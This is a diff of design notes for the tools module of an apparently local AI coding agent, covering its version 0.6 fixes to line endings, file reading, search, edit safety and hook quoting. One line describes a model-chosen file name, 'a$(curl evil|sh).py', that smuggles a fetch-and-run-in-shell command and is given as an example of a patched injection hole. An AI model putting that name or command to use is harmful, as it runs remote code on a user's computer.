@@ -17,13 +17,16 @@ agent (a second, independent check). The CLI also calls `check_workspace` after 
 ## Module header
 @@ localagent/tools.py header @@
 - Docstring states the core rule. Imports: `ast` (parse Python for `outline`), `difflib` (edit diffs for your
-  screen), `json` (MCP arguments), `os` (Windows or not, for hooks), `time` (session start), `fnmatch` (file-name patterns for
-  `search`), `re` (regular expressions for `search`), `sys` (the current Python's path,
-  `sys.executable`), `dataclass`, `Path`, `Callable`, the `Config`, sandbox helpers, and `verify_python`.
+  screen), `json` (MCP arguments), `time` (session start), `fnmatch` (file-name patterns for `search`), `re` (regular
+  expressions for `search`, braces in globs), `sys` (the current Python's path, `sys.executable`), `dataclass`, `Path`,
+  `Callable`, the `Config`, the sandbox helpers (`looks_binary`, `project_files`, `quote_for_shell`, `skip_dir` ...),
+  and `verify_python`.
 - `SKIP_DIRS` and `walk_files` now live in `sandbox.py` (one shared definition); `__all__` re-exports `SKIP_DIRS` so
   older imports keep working. `verify_file`/`CHECKED_SUFFIXES` come from `verify.py`.
   `MAX_SEARCH_HITS`: a search stops after 40 matches to protect the context window; `MAX_SEARCH_FILES` stops it after
-  20 000 files (with a hint to narrow the search) so a search in a giant folder cannot hang. `TOGETHER_HINT` is added to a
+  20 000 files (with a hint to narrow the search) so a search in a giant folder cannot hang. `MAX_SEARCH_BYTES`: files
+  over 2 MB (logs, data, bundled JavaScript) are not searched. `MAX_READ_BYTES`: files over 8 MB are only read in parts.
+  `EMPTY_OLD` is the refusal for an edit with nothing to find. `TOGETHER_HINT` is added to a
   rejection caused by an undefined name (ruff `F821`): it tells the model to send related edits — such as both halves
   of a rename — together in one `multi_edit`. Added after the `rename_function` eval showed the model making the two
   edits one by one, so the first was (correctly) rejected as inconsistent.
@@ -31,6 +34,31 @@ agent (a second, independent check). The CLI also calls `check_workspace` after 
 - `DONE_MARKS`: text endings that mean "this checklist item is finished" (see `_todo_item`).
 - `READ_ONLY`: the names of tools that never change anything (`list_files`, `read_file`, `search`, `outline`); the agent
   runs batches made only of these in parallel. `_installed` (from `verify.py`) tells whether ruff can be used.
+- `TextStyle` describes how a text file is written: its line break (`"\n"` or `"\r\n"`) and whether it starts with a
+  byte-order mark. `CRLF_SUFFIXES`: new Windows batch files (`.bat`, `.cmd`) get CRLF, which they need to run correctly.
+
+## Writing files exactly as they were written before
+**A data-integrity fix of version 0.6.** Python's `read_text` turns `\r\n` into `\n`, and `write_text` on Windows turns
+every `\n` back into `\r\n`. So before 0.6 one small `edit_file` on Windows rewrote **every line** of a file that used
+Unix line breaks (most projects from GitHub): git then showed the whole file as changed. Even a *rejected* write did it,
+because the rollback wrote the old text back the same way. Files with a byte-order mark lost or doubled it. Now each
+file keeps its own line breaks and mark, and a rollback restores the exact old bytes.
+
+@@ localagent/tools.py text_style @@
+- Counts `\r\n` against lone `\n`: a file that mostly uses CRLF is written with CRLF, otherwise LF (a file mixing both is
+  made consistent with its majority). Notes whether it starts with the mark `﻿`.
+
+@@ localagent/tools.py read_text @@
+- Opens the file with `newline=""` (the `\r\n` stay visible), notes the style, and returns the text with plain `\n`
+  and without the mark — the form the model sees and edits match against.
+
+@@ localagent/tools.py write_text @@
+- Writes the text back in the given style: the mark first if the file had one, and `newline=` makes Python write every
+  `\n` as the file's own line break. `\r\n` sent by the model is turned into `\n` first, so it can never become `\r\r\n`.
+
+@@ localagent/tools.py _globs @@
+- Python's `fnmatch` has no braces, but models often write `*.{js,ts}`; this expands them into `*.js` and `*.ts`
+  (recursively, for several brace groups).
 
 ## `_todo_item`
 @@ localagent/tools.py _todo_item @@
@@ -72,6 +100,7 @@ agent (a second, independent check). The CLI also calls `check_workspace` after 
   from the settings.
 - `started` is when this toolbox (session) began; files changed after it count as "this session's".
 - `writes` counts successful file writes (the agent uses it to notice "asked for a change, changed nothing"). `_failures` counts rejected writes per file. `_tools` is a `{name: Tool}` table built by `_build`.
+- `test_command` is your own test command from the settings (empty = let the runner choose, see `runners.md`).
 
 ## Public API
 @@ localagent/tools.py ToolBox.close @@
@@ -94,8 +123,9 @@ agent (a second, independent check). The CLI also calls `check_workspace` after 
 @@ localagent/tools.py ToolBox.call @@
 - Looks the tool up; an unknown name (models sometimes invent tools) returns an error that lists the real ones.
 - Runs the function and converts expected failures into strings: `SandboxError` (path escape) → `ERROR:`;
-  `KeyError`/`TypeError`/`ValueError` (missing or wrong-typed argument) → "bad arguments"; `OSError` (permissions,
-  disk) → `ERROR:`.
+  `UnicodeDecodeError` (editing a file that is not UTF-8 text) → a clear "not UTF-8 text" error (it used to read "bad
+  arguments", which sent the model looking for a mistake in its arguments); `KeyError`/`TypeError`/`ValueError` (missing
+  or wrong-typed argument) → "bad arguments"; `OSError` (permissions, disk) → `ERROR:`.
 
 ## The tool table
 @@ localagent/tools.py ToolBox._build @@
@@ -106,31 +136,45 @@ agent (a second, independent check). The CLI also calls `check_workspace` after 
   `run_shell`, plus `todo` (a checklist) and `fetch_url` (read a web page; always asked or ruled). The list is built as "base tools + optional shell tool", so the model
   never even sees a shell tool unless the runner offers one (Docker, or `--allow-shell` on this computer). The shell
   tool's description names where it runs (`shell_label`), e.g. "PowerShell on this Windows computer".
-- The descriptions are part of the prompt, so they are written to tell the model *when* to use each tool.
+- The descriptions are part of the prompt, so they are written to tell the model *when* to use each tool. Version 0.6
+  updated three: `search` (all text files by default, `.gitignore` honoured, glob examples), `write_file` ("code and
+  config files are verified" — it used to say only Python) and `run_tests` (whichever test tool the project uses).
 
 ## Read-only tools
 @@ localagent/tools.py ToolBox._list_files @@
 - Resolves the folder inside the sandbox; errors if it is not a folder; lists sorted names (folders get `/`), hiding
-  `SKIP_DIRS`; says "(empty folder)" when appropriate.
+  skipped *folders* (a file that happens to be called `dist` is still shown); says "(empty folder)" when appropriate.
 
 @@ localagent/tools.py ToolBox._read_file @@
-- Resolves and checks the file, reads it as text (undecodable bytes are replaced rather than crashing), clamps
-  `start` (at least 1) and `end` (at most the file length), prefixes each line with its number so the model can quote
-  exact locations, and truncates the result.
+- Resolves and checks the file. A **binary** file (`looks_binary`) is refused with its size — before 0.6 reading a model
+  or image file returned thousands of garbage characters.
+- Files over `MAX_READ_BYTES` go to `_read_part`. Others are read as text (a byte-order mark dropped, undecodable bytes
+  replaced rather than crashing); `start` and `end` may be missing or `null`; a `start` past the end says how long the
+  file is; each line is prefixed with its number so the model can quote exact locations.
+- A read of only part of the file ends with `(lines 20-60 of 340)`, so the model knows there is more without guessing.
+  The result is truncated.
+
+@@ localagent/tools.py ToolBox._read_part @@
+- Reads a very large file (a log, a data dump) **line by line**, keeping only lines `start` to `end` and stopping after
+  `end`, so it never loads the whole file. Without `end` it asks the model to find the lines with `search` first.
 
 @@ localagent/tools.py ToolBox._search @@
 - Compiles the regular expression; an invalid one returns a readable error instead of crashing.
-- Walks the chosen folder with `walk_files` (stopping after `MAX_SEARCH_FILES` files with a note) and keeps files whose
-  *name* matches `glob` (default `*.py`, e.g.
-  `*.js` for JavaScript).
-- Binary files raise `UnicodeDecodeError` and are skipped. Each matching line is reported as `path:line: text`
-  (stripped and cut to 120 characters). After 40 hits it stops and says so; no hits returns "no matches".
+- Searches the chosen folder with `project_files` (so `.gitignore`d files are skipped) — or just that file, when
+  `path` names a file — stopping after `MAX_SEARCH_FILES` files with a note.
+- **The default is now every text file** (`*`). Before 0.6 it was `*.py`, so in a JavaScript, Go or Rust project a search
+  without a `glob` found nothing at all, and the model concluded the code did not exist. A `glob` is matched against the
+  file name *and* the workspace path, so `src/*.ts` works, and braces work (`*.{js,ts}`, via `_globs`).
+- Files over `MAX_SEARCH_BYTES`, binary files and files in other encodings are skipped. Each matching line is reported
+  as `path:line: text` (stripped and cut to 120 characters). After 40 hits it stops and says so; no hits returns
+  "no matches".
 
 @@ localagent/tools.py ToolBox._outline @@
 - A *repo-map* tool for big projects: instead of reading whole files the model asks for the shape of the code.
-  For a file or for every `.py` file under a folder (found with `walk_files`) it parses the source with `ast` and lists top-level classes (with
-  their methods) and functions, each with its line number, so a following `read_file` can target just those lines.
-  Unparseable files show `(cannot parse)` (the write gate normally prevents them), and the result is truncated.
+  For a file or for every `.py` file under a folder (found with `project_files`) it parses the source with `ast` and
+  lists top-level classes (with their methods) and functions, each with its line number, so a following `read_file` can
+  target just those lines. Unparseable files show `(cannot parse)` (the write gate normally prevents them), and the
+  result is truncated.
 
 @@ localagent/tools.py ToolBox._todo @@
 - Like Claude Code's to-do list: the model sends its whole plan as a list (each item `{text, done}` or plain text,
@@ -142,9 +186,16 @@ agent (a second, independent check). The CLI also calls `check_workspace` after 
 - Simply forwards to `_commit`.
 
 @@ localagent/tools.py ToolBox._edit_file @@
-- Requires the file to exist, counts occurrences of `old`, and refuses unless there is **exactly one** (zero = nothing
-  to replace, several = ambiguous; the error then hints at `all=true`). The replacement goes through the same verified
-  `_commit`.
+- Requires the file to exist. `old` and `new` get plain `\n` line breaks, like the text they are matched against.
+- **An empty `old` is refused.** Every text "contains" the empty string once between every two characters: with
+  `all=true`, `"abc".replace("", "X")` gives `"XaXbXcX"`. Before 0.6 such a call was *accepted* for unchecked files
+  (Markdown, HTML, CSS ...) and wrote exactly that.
+- Reads the file with `read_text` (remembering its style), counts occurrences of `old`, and refuses unless there is
+  **exactly one** (zero = nothing to replace, several = ambiguous; the error then hints at `all=true`). The replacement
+  goes through the same verified `_commit`, in the file's own style.
+- The byte-order mark is normally invisible to edits and always kept. Only when `old` itself starts with the mark
+  (`﻿`) — the model deliberately editing it — does the mark become part of the text, so that `new` decides whether
+  it stays. Without this a model could never remove one: the style would put it back after every write.
 - **`all=true` (rename mode):** with this opt-in flag every occurrence is replaced (at least one must exist). It was added
   after the `rename_function` eval: the model had to rename a name used twice in `main.py`, the unique-match rule
   blocked it and it got stuck. The unique-match rule stays the default because it prevents accidental mass edits; the
@@ -152,9 +203,10 @@ agent (a second, independent check). The CLI also calls `check_workspace` after 
 
 @@ localagent/tools.py ToolBox._multi_edit @@
 - Several edits to one file in **one model call and one verification** (fewer calls than repeated `edit_file`).
-  Edits are applied in order to an in-memory copy; every `old` must match exactly once at its turn. On the first problem
-  it returns an error naming the edit number and *nothing is written* (all-or-nothing). Success goes through `_commit`,
-  so the usual verify/rollback gate applies to the combined result. An empty or non-list `edits` is rejected.
+  Edits are applied in order to an in-memory copy; every `old` must be non-empty and match exactly once at its turn. On
+  the first problem it returns an error naming the edit number and *nothing is written* (all-or-nothing). Success goes
+  through `_commit` in the file's own style, so the usual verify/rollback gate applies to the combined result. An empty
+  or non-list `edits` is rejected.
 
 @@ localagent/tools.py ToolBox._format @@
 - Best-effort auto-format: if `auto_format` is on and ruff is installed, runs `ruff format <file>` in the workspace
@@ -162,24 +214,29 @@ agent (a second, independent check). The CLI also calls `check_workspace` after 
   output is ignored. Result: consistent style at zero model cost. Because formatting may change the file's text, the
   model should re-read before an exact-match `edit_file` if it is unsure.
 
+@@ localagent/tools.py ToolBox._style_of @@
+- The style for a write that did not come from an edit (`write_file`): an existing file keeps its own; a new file gets
+  LF — or CRLF for `.bat`/`.cmd` — and no mark.
+
 @@ localagent/tools.py ToolBox._commit @@
 - Resolves the path safely and computes `key`, the workspace-relative name used to count failures per file.
-- Remembers the previous content (`None` for a new file) so the write can be undone, creates parent folders, writes.
+- Remembers the previous content **as bytes** (`None` for a new file) so the write can be undone exactly, creates
+  parent folders, and writes in the given style (or `_style_of`).
 - Files with no check (not in `CHECKED_SUFFIXES`) are just written. Checkable files (Python, JSON, TOML, YAML and the
   languages in `verify.py`'s `CHECKERS`) go through `verify_file` on the file on disk.
 - **Pass:** clear this file's failure counter, count the write, run `_format` (Python only), remember the diff for
   your screen (`_remember_diff`), run the `after_edit` hook, and report success. Non-checkable files also get a diff
   and the hook. Non-Python files are
   just written and counted.
-- **Fail (rollback):** delete a brand-new file, or restore an overwritten file's previous content. Increment the
-  counter. An undefined-name error gets `TOGETHER_HINT`. When the counter reaches `max_fix_attempts` the message ends
+- **Fail (rollback):** delete a brand-new file, or write back an overwritten file's previous bytes unchanged. Increment
+  the counter. An undefined-name error gets `TOGETHER_HINT`. When the counter reaches `max_fix_attempts` the message ends
   with `STOP`, steering the model to explain the problem
   instead of looping; otherwise it returns the exact errors and asks for a fix.
 
 @@ localagent/tools.py ToolBox._remember_diff @@
-- Compares the file before (empty for a new file) and after (re-read from disk, so formatting is included) with
-  `difflib.unified_diff`, one line of context, and drops the two `---`/`+++` header lines (the result line already names
-  the file).
+- Compares the file before (decoded from the saved bytes; empty for a new file) and after (re-read from disk, so
+  formatting is included) with `difflib.unified_diff`, one line of context, and drops the two `---`/`+++` header lines
+  (the result line already names the file).
 
 ## Hooks — your own commands, run automatically
 Like Claude Code's hooks. In `settings.json`:
@@ -187,8 +244,12 @@ Like Claude Code's hooks. In `settings.json`:
 {"hooks": {"after_edit": "ruff check {file}", "after_request": "python -m pytest -q"}}
 ```
 @@ localagent/tools.py ToolBox.run_hook @@
-- Runs the named hook if it is set (`{file}` becomes the changed file), through `shell_argv` (PowerShell on Windows, `sh` elsewhere),
-  in the project folder, with the normal time limit and output cap. No question is asked: you wrote the command.
+- Runs the named hook if it is set, through `shell_argv` (PowerShell on Windows, `sh` elsewhere), in the project folder,
+  with the normal time limit and output cap. No question is asked: you wrote the command.
+- `{file}` becomes the changed file's name **quoted by `quote_for_shell`**: the model chooses file names, and before 0.6
+  a name like `a$(curl evil|sh).py` ran its hidden command on your computer through this very line (see `sandbox.md`).
+  Ordinary names are inserted as they are, so existing hooks behave as before; do not put your own quotes around
+  `{file}`.
 
 @@ localagent/tools.py ToolBox._after_edit @@
 - Runs `after_edit` after every successful write. A failing hook (exit code not 0) adds its output to the write's
@@ -206,13 +267,15 @@ Like Claude Code's hooks. In `settings.json`:
 @@ localagent/tools.py ToolBox._run_python @@
 - Resolves the path, requires the file, **verifies again** (failure → `NOT RUN` plus errors), then passes the permission
   gate with subject = the file's workspace path (verification comes first so you are never asked about code that cannot
-  run). It runs with the current Python
+  run). It runs with the project's Python (see `runners.md`)
   through the runner (on this computer or in the container), using the path relative to the workspace so it is the
   same in both places, and returns the exit code and output.
 
 @@ localagent/tools.py ToolBox._run_tests @@
-- All checkable files changed this session (`since=self.started`) must pass `check_workspace` first. Then the permission gate (`run_tests`), then
-  `python -m unittest discover` through the runner, returning exit code and output.
+- All checkable files changed this session (`since=self.started`) must pass `check_workspace` first. Then the permission
+  gate (`run_tests`; the question names your `test_command` when there is one), then the runner runs the tests — your
+  `test_command`, or the tool it finds for the project (pytest, unittest, `npm test`, `go test`, `cargo test`) —
+  returning exit code and output.
 
 @@ localagent/tools.py ToolBox._run_shell @@
 - Only exists when the runner offers a shell (Docker, or `--allow-shell`). Refuses an empty command, passes the
